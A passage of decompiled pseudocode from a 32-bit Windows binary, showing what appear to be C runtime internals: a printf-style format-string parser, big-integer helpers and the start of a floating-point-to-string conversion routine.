  }
LABEL_36:
  v33 = 2;
  v31 = *(_DWORD *)(v3 + 8);
  if ( v31 > 0 )
  {
    v16 = v6 - &v38;
    if ( *(int *)(v3 + 12) > 0 )
      v16 = v6 - &v38 + *(_DWORD *)(v3 + 12);
    v17 = v32 / 10;
    if ( v17 != 0 )
    {
      v34 = v6;
      v18 = v16 - (((v36 & 0x1C0) == 0) - 6);
      do
      {
        ++v18;
        v17 /= 10;
      }
      while ( v17 != 0 );
      v19 = v18 - (v16 - (((v36 & 0x1C0) == 0) - 6));
      v20 = v18;
      v6 = v34;
      v33 = (__int16)(v19 + 2);
    }
    else
    {
      v20 = v16 - (((v36 & 0x1C0) == 0) - 6);
    }
    if ( v31 <= v20 )
    {
      v21 = -1;
LABEL_45:
      *(_DWORD *)(v3 + 8) = v21;
    }
    else
    {
      v21 = v31 - v20;
      if ( (v36 & 0x600) != 0 )
        goto LABEL_45;
      *(_DWORD *)(v3 + 8) = v21 - 1;
      do
      {
        sub_404E70(32, v3);
        v28 = *(_DWORD *)(v3 + 8);
        *(_DWORD *)(v3 + 8) = v28 - 1;
      }
      while ( v28 > 0 );
      v36 = *(_DWORD *)(v3 + 4);
    }
  }
  if ( (v36 & 0x80u) != 0 )
  {
    sub_404E70(45, v3);
  }
  else if ( (v36 & 0x100) != 0 )
  {
    sub_404E70(43, v3);
  }
  else if ( (v36 & 0x40) != 0 )
  {
    sub_404E70(32, v3);
  }
  sub_404E70(48, v3);
  sub_404E70(*(_DWORD *)(v3 + 4) & 0x20 | 0x58, v3);
  v23 = *(_DWORD *)(v3 + 8);
  if ( v23 > 0 && (*(_BYTE *)(v3 + 5) & 2) != 0 )
  {
    *(_DWORD *)(v3 + 8) = v23 - 1;
    do
    {
      sub_404E70(48, v3);
      v24 = *(_DWORD *)(v3 + 8);
      *(_DWORD *)(v3 + 8) = v24 - 1;
    }
    while ( v24 > 0 );
  }
  if ( &v38 < v6 )
  {
    do
    {
      v25 = *--v6;
      if ( v25 == 46 )
      {
        sub_405DA0(v3, v22);
      }
      else if ( v25 == 44 )
      {
        v37 = *(_WORD *)(v3 + 28);
        if ( v37 != 0 )
          sub_404ED0(&v37, 1, v3);
      }
      else
      {
        sub_404E70(v25, v3);
      }
    }
    while ( v6 != &v38 );
  }
  while ( 1 )
  {
    v26 = *(_DWORD *)(v3 + 12);
    *(_DWORD *)(v3 + 12) = v26 - 1;
    if ( v26 <= 0 )
      break;
    sub_404E70(48, v3);
  }
  sub_404E70(*(_DWORD *)(v3 + 4) & 0x20 | 0x50, v3);
  *(_DWORD *)(v3 + 8) += v33;
  *(_DWORD *)(v3 + 4) |= 0x1C0u;
  return sub_405980(v29, HIDWORD(v29), v3);
}


// ----- sub_406C40 @ 0x406c40 -----
int __cdecl sub_406C40(__int16 a1, FILE *a2, int a3, char *a4, unsigned int *a5)
{
  int v5; // eax
  int result; // eax
  char v7; // cl
  char *v8; // ebx
  int v9; // esi
  char v10; // al
  char *v11; // edx
  unsigned int v12; // edi
  char *v13; // esi
  int v14; // ebx
  char *v15; // ecx
  char *v16; // eax
  unsigned int *v17; // ebx
  unsigned int v18; // eax
  unsigned int v19; // edx
  int v20; // ecx
  double v21; // rax
  wchar_t *v22; // edi
  size_t v23; // eax
  double *v24; // edi
  bool v25; // zf
  double *v26; // edi
  double *v27; // edi
  char *v28; // eax
  int v29; // eax
  unsigned int v30; // ecx
  int v31; // eax
  double *v32; // eax
  int v33; // edx
  __int16 v34; // fps
  __int16 v36; // fps
  __int16 v37; // cx
  unsigned int *v38; // eax
  __int16 v39; // fps
  __int16 v41; // fps
  double v43; // rax
  __int16 v44; // di
  __int16 v45; // cx
  _BYTE *v46; // eax
  int v47; // ebx
  struct lconv *v48; // eax
  int v49; // eax
  char *v50; // ecx
  _TBYTE Character; // [esp+0h] [ebp-D8h]
  char *v52; // [esp+10h] [ebp-C8h]
  int ErrorMessage; // [esp+14h] [ebp-C4h]
  char *v54; // [esp+18h] [ebp-C0h]
  int *v55; // [esp+1Ch] [ebp-BCh]
  int v56; // [esp+1Ch] [ebp-BCh]
  int v57; // [esp+20h] [ebp-B8h]
  unsigned int *v58; // [esp+20h] [ebp-B8h]
  int v59; // [esp+2Ch] [ebp-ACh]
  __int16 v60; // [esp+48h] [ebp-90h]
  __int16 v61; // [esp+68h] [ebp-70h]
  __int16 v62; // [esp+7Eh] [ebp-5Ah] BYREF
  _DWORD v63[5]; // [esp+80h] [ebp-58h] BYREF
  FILE *Stream; // [esp+94h] [ebp-44h] BYREF
  int v65; // [esp+98h] [ebp-40h]
  int v66; // [esp+9Ch] [ebp-3Ch] BYREF
  _DWORD v67[2]; // [esp+A0h] [ebp-38h] BYREF
  __int16 v68; // [esp+A8h] [ebp-30h]
  int v69; // [esp+ACh] [ebp-2Ch]
  __int16 v70; // [esp+B0h] [ebp-28h]
  int v71; // [esp+B4h] [ebp-24h]
  int v72; // [esp+B8h] [ebp-20h]
  int v73; // [esp+BCh] [ebp-1Ch]

  v67[1] = -3;
  v5 = *errno();
  v68 = 0;
  v69 = 0;
  ErrorMessage = v5;
  v70 = 0;
  Stream = a2;
  v71 = 0;
  v73 = -1;
  v59 = a1 & 0x6000;
  v65 = v59;
  v72 = a3;
  result = *a4;
  if ( *a4 != 0 )
  {
    v7 = *a4;
    v8 = a4 + 1;
    while ( result != 37 )
    {
      v9 = v71;
      if ( (v65 & 0x4000) != 0 || v72 > v71 )
      {
        if ( (v65 & 0x2000) != 0 )
          fputc(result, Stream);
        else
          *((_BYTE *)&Stream->_ptr + v71) = v7;
      }
LABEL_7:
      v71 = v9 + 1;
LABEL_8:
      v7 = *v8++;
      result = v7;
      if ( v7 == 0 )
        return v71;
    }
    v67[0] = -1;
    v66 = -1;
    v65 = a1 & 0x6000;
    v10 = *v8;
    if ( *v8 != 0 )
    {
      v57 = 0;
      v11 = v8;
      v54 = v8;
      v55 = &v66;
      v12 = 0;
      while ( 1 )
      {
        v13 = v11 + 1;
        v14 = v10;
        switch ( v10 )
        {
          case ' ':
            if ( v12 == 0 )
              v65 |= 0x40u;
            goto LABEL_83;
          case '#':
            if ( v12 != 0 )
              goto LABEL_83;
            v10 = v11[1];
            v65 |= 0x800u;
            ++v11;
            goto LABEL_24;
          case '%':
            v47 = v71;
            if ( (v65 & 0x4000) != 0 || v72 > v71 )
            {
              if ( (v65 & 0x2000) != 0 )
                fputc(37, Stream);
              else
                *((_BYTE *)&Stream->_ptr + v71) = 37;
            }
            v71 = v47 + 1;
            v8 = v13;
            goto LABEL_8;
          case '\'':
            if ( v12 == 0 )
            {
              v52 = v11;
              v65 |= 0x1000u;
              v63[0] = 0;
              v63[1] = 0;
              v48 = localeconv();
              v49 = sub_40A740((int)&v62, v48->thousands_sep, 16, (int)v63);
              v11 = v52;
              if ( v49 > 0 )
                v70 = v62;
              v69 = v49;
            }
            goto LABEL_83;
          case '*':
            if ( v55 == nullptr )
              goto LABEL_106;
            if ( (v12 & 5) != 0 )
            {
              v10 = v11[1];
              v12 = 4;
              ++v11;
              v55 = nullptr;
            }
            else
            {
              v46 = (_BYTE *)*a5;
              *v55 = *a5;
              if ( (int)v46 >= 0 )
                goto LABEL_100;
              if ( v12 == 0 )
              {
                v65 |= 0x400u;
                v66 = -v66;
LABEL_100:
                v10 = v11[1];
                ++a5;
                ++v11;
                v55 = nullptr;
                goto LABEL_24;
              }
              v10 = v11[1];
              ++a5;
              ++v11;
              v12 = 2;
              v67[0] = -1;
              v55 = nullptr;
            }
            goto LABEL_24;
          case '+':
            if ( v12 != 0 )
              goto LABEL_83;
            v10 = v11[1];
            v65 |= 0x100u;
            ++v11;
            goto LABEL_24;
          case '-':
            if ( v12 != 0 )
            {
LABEL_83:
              v10 = v11[1];
              v11 = v13;
            }
            else
            {
              v10 = v11[1];
              v65 |= 0x400u;
              ++v11;
            }
            goto LABEL_24;
          case '.':
            if ( v12 <= 1 )
            {
              v10 = v11[1];
              v67[0] = 0;
              ++v11;
              v55 = v67;
              v12 = 2;
            }
            else
            {
LABEL_106:
              v10 = v11[1];
              v12 = 4;
              ++v11;
            }
            goto LABEL_24;
          case '0':
            if ( v12 == 0 )
            {
              v10 = v11[1];
              v65 |= 0x200u;
              ++v11;
              goto LABEL_24;
            }
            if ( v12 == 4 )
              goto LABEL_167;
            v14 = 48;
            goto LABEL_132;
          case 'A':
            v33 = v65;
            v32 = (double *)a5;
            if ( (v65 & 4) == 0 )
              goto LABEL_87;
            goto LABEL_72;
          case 'C':
            v67[0] = -1;
            goto LABEL_127;
          case 'E':
            v26 = (double *)a5;
            if ( (v65 & 4) == 0 )
              goto LABEL_129;
            goto LABEL_52;
          case 'F':
            v24 = (double *)a5;
            if ( (v65 & 4) == 0 )
              goto LABEL_119;
            goto LABEL_50;
          case 'G':
            v27 = (double *)a5;
            if ( (v65 & 4) == 0 )
              goto LABEL_121;
            goto LABEL_54;
          case 'I':
            v10 = v11[1];
            if ( v10 == 54 )
            {
              if ( v11[2] == 52 )
              {
                v10 = v11[3];
                v12 = 4;
                v11 += 3;
                v57 = 3;
                goto LABEL_24;
              }
              v15 = v11 + 2;
              v12 = 4;
              ++v11;
              v14 = 54;
              v57 = 0;
              v13 = v15;
            }
            else
            {
              if ( v10 != 51 )
              {
                v57 = 0;
                ++v11;
                v12 = 4;
                goto LABEL_24;
              }
              if ( v11[2] == 50 )
              {
                v10 = v11[3];
                v12 = 4;
                v11 += 3;
                v57 = 2;
                goto LABEL_24;
              }
              v50 = v11 + 2;
              v12 = 4;
              ++v11;
              v14 = 51;
              v57 = 0;
              v13 = v50;
            }
LABEL_16:
            if ( (unsigned __int8)(v10 - 48) > 9u || v12 == 4 )
            {
LABEL_167:
              v8 = v54;
              v9 = v71;
              if ( (v65 & 0x4000) != 0 || v72 > v71 )
              {
                if ( (v65 & 0x2000) != 0 )
                  fputc(37, Stream);
                else
                  *((_BYTE *)&Stream->_ptr + v71) = 37;
              }
              goto LABEL_7;
            }
            if ( v12 != 0 )
            {
LABEL_132:
              v16 = v11;
              v11 = v13;
              if ( v12 == 2 )
                v12 = 3;
            }
            else
            {
              v16 = v11;
              v12 = 1;
              v11 = v13;
            }
            if ( v55 != nullptr )
            {
              if ( *v55 < 0 )
              {
                v10 = v16[1];
                *v55 = v14 - 48;
                goto LABEL_24;
              }
              *v55 = v14 + 10 * *v55 - 48;
            }
            v10 = v16[1];
LABEL_24:
            if ( v10 == 0 )
              return v71;
            break;
          case 'L':
            v10 = v11[1];
            v65 |= 4u;
            ++v11;
            v12 = 4;
            goto LABEL_24;
          case 'S':
            goto LABEL_43;
          case 'X':
          case 'o':
          case 'u':
          case 'x':
            v65 &= ~0x100u;
            v56 = v10;
            if ( v57 == 3 )
            {
              v19 = a5[1];
              v17 = a5 + 2;
              v18 = *a5;
            }
            else
            {
              v17 = a5 + 1;
              if ( v57 == 2 )
              {
                v18 = *a5;
                v19 = 0;
              }
              else
              {
                v18 = *a5;
                if ( v57 == 1 )
                {
                  v18 = (unsigned __int16)v18;
                  v19 = 0;
                }
                else
                {
                  if ( v57 == 5 )
                    v18 = (unsigned __int8)v18;
                  v19 = 0;
                }
              }
            }
            if ( v56 == 117 )
              sub_405980(v18, v19, (int)&Stream);
            else
              sub_405280(v56, v18, v19, (int)&Stream);
            goto LABEL_48;
          case 'a':
            v32 = (double *)a5;
            v33 = v65 | 0x20;
            v65 = v33;
            if ( (v33 & 4) == 0 )
            {
LABEL_87:
              v58 = (unsigned int *)(v32 + 1);
              _ST7 = *(double *)a5;
              __asm { fxam }
              if ( (v39 & 0x4500) == 0x100 )
              {
                sub_4051F0(0, (int)"NaN", (int)&Stream);
              }
              else
              {
                _ST6 = _ST7;
                if ( v60 < 0 )
                {
                  LOBYTE(v33) = v33 | 0x80;
                  v65 = v33;
                }
                __asm { fxam }
                if ( (v41 & 0x4500) == 0x500 )
                {
                  sub_4051F0(v60 & 0x8000, (int)"Inf", (int)&Stream);
                }
                else
                {
                  v43 = _ST7;
                  v44 = v60 & 0x7FFF;
                  if ( (v60 & 0x7FFF) != 0 )
                  {
                    if ( (v60 & 0x7FFFu) > 0x3C00 )
                    {
                      v45 = v60 & 0x7FFF;
                    }
                    else
                    {
                      *(_QWORD *)&v43 = *(_QWORD *)&_ST7 >> (1 - (unsigned __int8)v60);
                      v45 = 15361;
                    }
                    v44 = v45 - 16380;
                  }
                  else if ( _ST7 != 0.0 )
                  {
                    v44 = -1019;
                  }
                  sub_4066F0(*(_QWORD *)&v43 >> 3, v44, (int)&Stream);
                }
              }
              v8 = v13;
              a5 = v58;
              goto LABEL_8;
            }
LABEL_72:
            _ST7 = *(unsigned __int64 *)v32;
            v17 = (unsigned int *)v32 + 3;
            __asm { fxam }
            if ( (v34 & 0x4500) == 0x100 )
            {
              sub_4051F0(0, (int)"NaN", (int)&Stream);
            }
            else
            {
              if ( v61 < 0 )
              {
                LOBYTE(v33) = v33 | 0x80;
                v65 = v33;
              }
              __asm { fxam }
              if ( (v36 & 0x4500) == 0x500 )
              {
                sub_4051F0(v61 & 0x8000, (int)"Inf", (int)&Stream);
              }
              else
              {
                v37 = v61 & 0x7FFF;
                if ( (v61 & 0x7FFF) != 0 )
                {
                  v37 = (v61 & 0x7FFF) - 0x3FFF;
                }
                else if ( *(double *)&_ST7 != 0.0 )
                {
                  v37 = -16382;
                }
                sub_4066F0(_ST7, v37, (int)&Stream);
              }
            }
            goto LABEL_48;
          case 'c':
            v67[0] = -1;
            if ( (unsigned int)(v57 - 2) <= 1 )
            {
LABEL_127:
              v8 = v11 + 1;
              LOWORD(v63[0]) = *a5;
              sub_404ED0((unsigned __int16 *)v63, 1, (int)&Stream);
              ++a5;
            }
            else
            {
              v38 = a5++;
              v8 = v11 + 1;
              LOBYTE(v63[0]) = *v38;
              sub_405050((int)v63, 1, (int)&Stream);
            }
            goto LABEL_8;
          case 'd':
          case 'i':
            v65 |= 0x80u;
            if ( v57 == 3 )
            {
              v21 = *(double *)a5;
              a5 += 2;
            }
            else
            {
              v20 = *a5++;
              *(_QWORD *)&v21 = v20;
              if ( v57 != 2 )
              {
                if ( v57 == 1 )
                {
                  *(_QWORD *)&v21 = (__int16)v20;
                }
                else if ( v57 == 5 )
                {
                  *(_QWORD *)&v21 = (char)v20;
                }
              }
            }
            v8 = v13;
            sub_405980(LODWORD(v21), HIDWORD(v21), (int)&Stream);
            goto LABEL_8;
          case 'e':
            v26 = (double *)a5;
            v25 = (v65 & 4) == 0;
            v65 |= 0x20u;
            if ( v25 )
            {
LABEL_129:
              v8 = v11 + 1;
              *(double *)&Character = *v26;
              sub_406420(&Stream, Character);
              a5 += 2;
            }
            else
            {
LABEL_52:
              v8 = v11 + 1;
              *(double *)&Character = *v26;
              sub_406420(&Stream, Character);
              a5 += 3;
            }
            goto LABEL_8;
          case 'f':
            v24 = (double *)a5;
            v25 = (v65 & 4) == 0;
            v65 |= 0x20u;
            if ( v25 )
            {
LABEL_119:
              v8 = v11 + 1;
              *(double *)&Character = *v24;
              sub_4064B0((int)&Stream, Character);
              a5 += 2;
            }
            else
            {
LABEL_50:
              v8 = v11 + 1;
              *(double *)&Character = *v24;
              sub_4064B0((int)&Stream, Character);
              a5 += 3;
            }
            goto LABEL_8;
          case 'g':
            v27 = (double *)a5;
            v25 = (v65 & 4) == 0;
            v65 |= 0x20u;
            if ( v25 )
            {
LABEL_121:
              v8 = v11 + 1;
              *(double *)&Character = *v27;
              sub_406580(&Stream, Character);
              a5 += 2;
            }
            else
            {
LABEL_54:
              v8 = v11 + 1;
              *(double *)&Character = *v27;
              sub_406580(&Stream, Character);
              a5 += 3;
            }
            goto LABEL_8;
          case 'h':
            v10 = v11[1];
            if ( v10 == 104 )
            {
              v10 = v11[2];
              v12 = 4;
              v11 += 2;
              v57 = 5;
            }
            else
            {
              v57 = 1;
              ++v11;
              v12 = 4;
            }
            goto LABEL_24;
          case 'j':
            v10 = v11[1];
            v12 = 4;
            ++v11;
            v57 = 3;
            goto LABEL_24;
          case 'l':
            v10 = v11[1];
            if ( v10 == 108 )
            {
              v10 = v11[2];
              v12 = 4;
              v11 += 2;
              v57 = 3;
            }
            else
            {
              v57 = 2;
              ++v11;
              v12 = 4;
            }
            goto LABEL_24;
          case 'm':
            v8 = v11 + 1;
            v28 = strerror(ErrorMessage);
            sub_4051A0(v28, (int)&Stream);
            goto LABEL_8;
          case 'n':
            v29 = v71;
            if ( v57 == 5 )
            {
              *(_BYTE *)*a5 = v71;
            }
            else
            {
              v30 = *a5;
              if ( v57 == 1 )
              {
                *(_WORD *)v30 = v71;
              }
              else if ( v57 == 2 )
              {
                *(_DWORD *)v30 = v71;
              }
              else
              {
                *(_DWORD *)v30 = v71;
                if ( v57 == 3 )
                  *(_DWORD *)(v30 + 4) = v29 >> 31;
              }
            }
            ++a5;
            v8 = v11 + 1;
            goto LABEL_8;
          case 'p':
            if ( v12 == 0 )
            {
              v31 = a1 & 0x6000;
              if ( v65 == v59 )
              {
                BYTE1(v31) = BYTE1(v59) | 2;
                v67[0] = 8;
                v65 = v31;
              }
            }
            v8 = v11 + 1;
            sub_405280(120, *a5++, 0, (int)&Stream);
            goto LABEL_8;
          case 's':
            if ( (unsigned int)(v57 - 2) > 1 )
            {
              v8 = v11 + 1;
              sub_4051A0((const char *)*a5++, (int)&Stream);
            }
            else
            {
LABEL_43:
              v22 = (wchar_t *)*a5;
              v17 = a5 + 1;
              if ( *a5 == 0 )
                v22 = (wchar_t *)L"(null)";
              if ( v67[0] < 0 )
                v23 = wcslen(v22);
              else
                v23 = sub_40A340(v22, v67[0]);
              sub_404ED0(v22, v23, (int)&Stream);
LABEL_48:
              a5 = v17;
              v8 = v13;
            }
            goto LABEL_8;
          case 't':
          case 'z':
            v10 = v11[1];
            v12 = 4;
            ++v11;
            v57 = 0;
            goto LABEL_24;
          default:
            goto LABEL_16;
        }
      }
    }
    return v71;
  }
  return result;
}


// ----- sub_407800 @ 0x407800 -----
_DWORD *__cdecl sub_407800(int a1)
{
  int v1; // ebx
  int v2; // eax
  _DWORD *v3; // eax

  v1 = 0;
  if ( a1 > 19 )
  {
    v2 = 4;
    do
    {
      v2 *= 2;
      ++v1;
    }
    while ( v2 + 15 < a1 );
  }
  v3 = (_DWORD *)sub_4095C0(v1);
  *v3 = v1;
  return v3 + 1;
}


// ----- sub_407840 @ 0x407840 -----
_BYTE *__cdecl sub_407840(char *a1, _DWORD *a2, int a3)
{
  int v3; // eax
  int v4; // ebx
  int v5; // eax
  _BYTE *v6; // ebx
  char v7; // dl
  char *v8; // eax
  _BYTE *v9; // edx
  char v10; // cl

  if ( a3 <= 19 )
  {
    v4 = 0;
  }
  else
  {
    v3 = 4;
    v4 = 0;
    do
    {
      v3 *= 2;
      ++v4;
    }
    while ( a3 > v3 + 15 );
  }
  v5 = sub_4095C0(v4);
  *(_DWORD *)v5 = v4;
  v6 = (_BYTE *)(v5 + 4);
  v7 = *a1;
  *(_BYTE *)(v5 + 4) = *a1;
  if ( v7 != 0 )
  {
    v8 = a1 + 1;
    v9 = v6;
    do
    {
      v10 = *v8;
      ++v9;
      ++v8;
      *v9 = v10;
    }
    while ( v10 != 0 );
  }
  else
  {
    v9 = (_BYTE *)(v5 + 4);
  }
  if ( a2 != nullptr )
    *a2 = v9;
  return v6;
}


// ----- sub_4078D0 @ 0x4078d0 -----
int __cdecl sub_4078D0(_DWORD *a1)
{
  int v1; // ecx

  v1 = *(a1 - 1);
  *a1 = v1;
  a1[1] = 1 << v1;
  return sub_4096A0(a1 - 1);
}


// ----- sub_407900 @ 0x407900 -----
unsigned int __cdecl sub_407900(int a1, int a2)
{
  int v2; // edi
  unsigned int result; // eax
  unsigned int v4; // ebx
  int v5; // eax
  unsigned int *v6; // esi
  unsigned int v7; // edi
  unsigned int v8; // eax
  __int64 v9; // rcx
  int v10; // edx
  unsigned int *v11; // ecx
  int v12; // esi
  unsigned __int64 v13; // rax
  _DWORD *v14; // edx
  unsigned int v15; // eax
  int v16; // edx
  _DWORD *v17; // [esp+14h] [ebp-44h]
  int v18; // [esp+18h] [ebp-40h]
  unsigned int v19; // [esp+1Ch] [ebp-3Ch]
  int v20; // [esp+20h] [ebp-38h]
  unsigned int v21; // [esp+24h] [ebp-34h]
  __int64 v22; // [esp+28h] [ebp-30h]
  __int64 v23; // [esp+30h] [ebp-28h]
  unsigned int v24; // [esp+38h] [ebp-20h]
  _DWORD *v25; // [esp+3Ch] [ebp-1Ch]

  v2 = *(_DWORD *)(a2 + 16);
  result = 0;
  v18 = v2;
  if ( *(_DWORD *)(a1 + 16) >= v2 )
  {
    v4 = a2 + 20;
    v20 = v2 - 1;
    v5 = 4 * (v2 - 1);
    v21 = a1 + 20;
    v17 = (_DWORD *)(a1 + 20 + v5);
    v25 = (_DWORD *)(a2 + 20 + v5);
    v24 = *v17 / (unsigned int)(*v25 + 1);
    v19 = v24;
    if ( *v17 >= (unsigned int)(*v25 + 1) )
    {
      v22 = 0;
      v6 = (unsigned int *)(a1 + 20);
      v7 = a2 + 20;
      v23 = 0;
      do
      {
        v7 += 4;
        v8 = v22 + v24 * *(_DWORD *)(v7 - 4);
        LODWORD(v22) = (v22 + v24 * (unsigned __int64)*(unsigned int *)(v7 - 4)) >> 32;
        HIDWORD(v22) = 0;
        v9 = *v6++ - (unsigned __int64)v8 - v23;
        *(v6 - 1) = v9;
        v23 = BYTE4(v9) & 1;
      }
      while ( (unsigned int)v25 >= v7 );
      v4 = a2 + 20;
      if ( *v17 == 0 )
      {
        if ( v21 < (unsigned int)(v17 - 1) )
        {
          v10 = v20;
          do
          {
            if ( v17[v10 - v18] != 0 )
              break;
            --v10;
          }
          while ( v18 - 2 - (((unsigned int)v17 - a1 - 25) >> 2) != v10 );
          v20 = v10;
        }
        *(_DWORD *)(a1 + 16) = v20;
      }
    }
    if ( (int)sub_409D70(a1, a2) >= 0 )
    {
      v11 = (unsigned int *)(a1 + 20);
      v12 = 0;
      v19 = v24 + 1;
      do
      {
        v4 += 4;
        v13 = *v11++ - (unsigned __int64)*(unsigned int *)(v4 - 4) - (unsigned int)v12;
        *(v11 - 1) = v13;
        v12 = BYTE4(v13) & 1;
      }
      while ( (unsigned int)v25 >= v4 );
      v14 = (_DWORD *)(v21 + 4 * v20);
      if ( *v14 == 0 )
      {
        if ( v21 < (unsigned int)(v14 - 1) )
        {
          v15 = v20 - 1 - (((unsigned int)v14 - a1 - 25) >> 2);
          v16 = v20;
          do
          {
            if ( *(_DWORD *)(v21 + 4 * v16 - 4) != 0 )
              break;
            --v16;
          }
          while ( v16 != v15 );
          v20 = v16;
        }
        *(_DWORD *)(a1 + 16) = v20;
      }
    }
    return v19;
  }
  return result;
}


// ----- sub_407B00 @ 0x407b00 -----
_BYTE *__cdecl sub_407B00(int *a1, int a2, int *a3, int *a4, int a5, int a6, int *a7, _DWORD *a8)
{
  int v8; // esi
  int v9; // eax
  int v10; // edx
  int i; // eax
  int v12; // edi
  int v13; // edx
  int *v14; // eax
  int *v15; // ecx
  int v16; // ebx
  int v17; // ebx
  int v18; // ebx
  int v19; // eax
  unsigned int v20; // edx
  int v21; // eax
  double v22; // rax
  double v23; // rax
  int v24; // eax
  double v25; // st7
  int v27; // ecx
  double v28; // rax
  int v29; // esi
  double v30; // st6
  _DWORD *v31; // eax
  double v32; // st6
  double v33; // st7
  double v34; // st6
  char v35; // dl
  double v36; // rtt
  double v37; // st5
  char v38; // dl
  _BYTE *v39; // ebx
  _BYTE *v40; // ecx
  double v41; // st7
  double v42; // st5
  bool v43; // zf
  double j; // st6
  double v45; // st6
  double v46; // st5
  int v47; // eax
  int v48; // edx
  int v49; // eax
  int v50; // eax
  int v51; // eax
  bool v52; // bl
  char v53; // bl
  int v54; // ebx
  int v55; // eax
  int v56; // eax
  double v57; // rax
  double v58; // st6
  unsigned int v59; // eax
  int v60; // eax
  int v61; // ecx
  int v62; // eax
  int v63; // ebx
  _DWORD *v64; // ebx
  _DWORD *v65; // ebx
  int m; // eax
  int v67; // edx
  unsigned int v68; // eax
  int v69; // esi
  int v70; // eax
  _DWORD *v71; // ebx
  _DWORD *v72; // ecx
  _BYTE *v73; // eax
  bool v74; // si
  _BYTE *v75; // esi
  int k; // eax
  unsigned int v77; // eax
  int v78; // eax
  unsigned int v79; // ebx
  int v80; // esi
  int v81; // eax
  int v82; // eax
  int v83; // ebx
  _BYTE *v84; // ebx
  char v85; // dl
  int v86; // eax
  int v87; // eax
  _DWORD *v88; // ebx
  _DWORD *v89; // esi
  _DWORD *v90; // eax
  double v91; // st7
  double v92; // st6
  int v93; // edx
  double v94; // st4
  double v95; // st6
  double v96; // rax
  int v97; // ebx
  int v98; // eax
  _BYTE *v99; // edx
  int v100; // eax
  double v101; // st6
  void *v102; // [esp+0h] [ebp-B8h]
  double v103; // [esp+10h] [ebp-A8h]
  BOOL v104; // [esp+18h] [ebp-A0h]
  double v105; // [esp+18h] [ebp-A0h]
  int v106; // [esp+20h] [ebp-98h]
  int v107; // [esp+24h] [ebp-94h]
  int v108; // [esp+28h] [ebp-90h]
  int v109; // [esp+2Ch] [ebp-8Ch]
  int v110; // [esp+30h] [ebp-88h]
  int v111; // [esp+34h] [ebp-84h]
  int v112; // [esp+38h] [ebp-80h]
  double v113; // [esp+38h] [ebp-80h]
  int v114; // [esp+40h] [ebp-78h]
  int v115; // [esp+40h] [ebp-78h]
  int v116; // [esp+44h] [ebp-74h]
  int v117; // [esp+44h] [ebp-74h]
  char v118; // [esp+44h] [ebp-74h]
  double v119; // [esp+48h] [ebp-70h]
  _DWORD *v120; // [esp+48h] [ebp-70h]
  int v121; // [esp+48h] [ebp-70h]
  _DWORD *v122; // [esp+48h] [ebp-70h]
  _DWORD *v123; // [esp+48h] [ebp-70h]
  int v124; // [esp+50h] [ebp-68h]
  int v125; // [esp+50h] [ebp-68h]
  int v126; // [esp+54h] [ebp-64h]
  int v127; // [esp+58h] [ebp-60h]
  int v128; // [esp+5Ch] [ebp-5Ch]
  int v129; // [esp+60h] [ebp-58h]
  int v130; // [esp+60h] [ebp-58h]
  int v131; // [esp+60h] [ebp-58h]
  _BYTE *v132; // [esp+68h] [ebp-50h]
  int v133; // [esp+6Ch] [ebp-4Ch]
  unsigned int v134; // [esp+6Ch] [ebp-4Ch]
  _DWORD *v135; // [esp+70h] [ebp-48h]
  _DWORD *v136; // [esp+78h] [ebp-40h]
  _DWORD *v137; // [esp+7Ch] [ebp-3Ch]
  int v138; // [esp+80h] [ebp-38h]
  int v139; // [esp+80h] [ebp-38h]
  _BYTE *v140; // [esp+80h] [ebp-38h]
  _DWORD *v141; // [esp+80h] [ebp-38h]
  _DWORD *v142; // [esp+80h] [ebp-38h]
  _DWORD *v143; // [esp+80h] [ebp-38h]
  _DWORD *v144; // [esp+80h] [ebp-38h]
  int v145[7]; // [esp+9Ch] [ebp-1Ch] BYREF

  v138 = a5;
  v8 = *a4;
  v133 = a6;
  *a4 &= 0xFFFFFFCF;
  v9 = v8 & 7;
  if ( v9 == 3 )
  {
    *a7 = -32768;
    return sub_407840("Infinity", a8, 8);
  }
  v128 = v8 & 4;
  if ( (v8 & 4) != 0 )
  {
    if ( v9 != 4 )
      return nullptr;
    *a7 = -32768;
    return sub_407840("NaN", a8, 3);
  }
  if ( (v8 & 7) == 0 )
  {
LABEL_30:
    *a7 = 1;
    return sub_407840("0", a8, 1);
  }
  v10 = 0;
  v129 = *a1;
  for ( i = 32; v129 > i; ++v10 )
    i *= 2;
  v12 = sub_4095C0(v10);
  v13 = v12 + 20;
  v14 = a3;
  v15 = &a3[(v129 - 1) >> 5];
  do
  {
    v16 = *v14++;
    v13 += 4;
    *(_DWORD *)(v13 - 4) = v16;
  }
  while ( v15 >= v14 );
  v17 = 4 * ((v129 - 1) >> 5);
  if ( (char *)v15 + 1 < (char *)a3 + 1 )
    v17 = 0;
  v18 = (v17 + 4) >> 2;
  do
  {
    v19 = v18--;
    if ( *(_DWORD *)(v12 + 4 * v18 + 20) != 0 )
    {
      _BitScanReverse(&v20, *(_DWORD *)(v12 + 4 * v18 + 20));
      *(_DWORD *)(v12 + 16) = v19;
      v18 = 32 * v19 - (v20 ^ 0x1F);
      goto LABEL_14;
    }
  }
  while ( v18 != 0 );
  *(_DWORD *)(v12 + 16) = 0;
LABEL_14:
  v21 = sub_409460(v12);
  v145[0] = v21;
  v116 = a2;
  if ( v21 != 0 )
  {
    sub_409340(v12, v21);
    v18 -= v145[0];
    v116 = v145[0] + a2;
  }
  if ( *(_DWORD *)(v12 + 16) == 0 )
  {
    sub_4096A0(v12);
    goto LABEL_30;
  }
  v22 = sub_40A000(v12, v145);
  HIDWORD(v23) = HIDWORD(v22) & 0xFFFFF | 0x3FF00000;
  v119 = v23;
  LODWORD(v23) = 1 - (v18 + v116);
  if ( v18 + v116 - 1 >= 0 )
    LODWORD(v23) = v18 + v116 - 1;
  v24 = LODWORD(v23) - 1077;
  v25 = (v119 - 1.5) * 0.289529654602168 + 0.1760912590558 + (double)(v18 + v116 - 1) * 0.301029995663981;
  if ( v24 > 0 )
    v25 = v25 + (double)v24 * 7.0e-17;
  v126 = (int)v25;
  if ( v25 < 0.0 && (double)v126 != v25 )
    --v126;
  HIDWORD(v119) = HIDWORD(v23) + ((v18 + v116 - 1) << 20);
  v124 = -v116;
  if ( (unsigned int)v126 > 0x16 )
  {
    v108 = 1;
  }
  else
  {
    if ( dbl_7AD600[v126] <= v119 )
    {
      if ( 1 - v116 <= 0 )
      {
        v108 = 0;
        v114 = v116;
        v124 = v126;
        v110 = v126;
      }
      else
      {
        v110 = v126;
        v124 = v126 - v116;
        v108 = 0;
        v114 = 0;
      }
      goto LABEL_26;
    }
    --v126;
    v108 = 0;
  }
  v114 = 0;
